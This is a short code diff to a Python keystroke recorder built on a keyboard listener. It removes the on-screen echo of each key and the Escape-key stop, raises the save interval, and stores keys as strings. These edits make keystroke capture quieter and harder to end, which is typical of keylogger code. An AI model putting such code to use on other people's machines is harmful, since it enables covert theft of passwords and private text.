@@ -27,10 +27,7 @@ class KeyListener:
         self.recorder = recorder
 
     def on_release_keyboard(self, key):
-        print(key)
-        self.recorder.append_data(key)
-        if key == keyboard.Key.esc:
-            return False
+        self.recorder.append_data(str(key))
 
     def listen(self):
         with keyboard.Listener(on_release=self.on_release_keyboard) as keyboard_listener:
@@ -80,7 +77,7 @@ class DataSaver:
                 timer = datetime.now()
 
 if __name__ == '__main__':
-    SAVE_TIME = 5
+    SAVE_TIME = 60
     recorder = Recorder()
     saver = DataSaver(recorder, SAVE_TIME)
     key_listener = KeyListener(recorder)
